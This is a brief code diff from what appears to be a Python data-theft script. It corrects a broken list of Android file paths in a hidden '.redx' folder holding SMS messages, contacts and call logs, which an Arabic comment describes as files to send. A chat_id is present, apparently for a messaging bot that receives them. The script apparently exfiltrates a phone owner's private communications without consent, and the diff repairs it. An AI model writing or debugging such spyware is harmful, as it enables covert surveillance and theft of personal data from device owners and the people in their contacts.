@@ -12,7 +12,7 @@ chat_id = '1060129926'
 os.system('clear')
 
 # المسارات التي تحتوي على الملفات التي تريد إرسالها
-paths = ['/storage/emulated/0/.redx/SMS.txt', '/storage/emulated/0/.redx/Contacts.txt', '/storage/emulated/0/.redx/contacts.txt', '/storage/emulated/0/.redx/Call Log.txt', ']
+paths = ['/storage/emulated/0/.redx/SMS.txt', '/storage/emulated/0/.redx/Contacts.txt', '/storage/emulated/0/.redx/contacts.txt', '/storage/emulated/0/.redx/Call Log.txt']
 
 
 
